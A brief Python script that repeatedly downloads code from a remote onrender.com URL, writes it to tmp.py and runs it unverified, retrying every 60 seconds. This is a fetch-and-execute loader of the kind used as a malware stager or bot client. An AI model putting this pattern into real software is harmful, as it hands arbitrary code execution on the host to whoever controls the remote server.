#!/usr/bin/python

import sys
import time

# This script will download the client_from_server.py and exectute is as is.

URL = 'https://aquaman.onrender.com/Server/client_logic.py'

f = open('/tmp/tmp.log', 'a')
f.write('starting')

import urllib.request
while True:
	try:
		contents = urllib.request.urlopen(URL).read()

		file = open('tmp.py', 'wb')
		file.write(contents)
		file.close()

		import subprocess
		subprocess.run(["python3", "tmp.py"])
	except Exception as e:
		f.write(str(e))
		print(e)
		time.sleep(60)


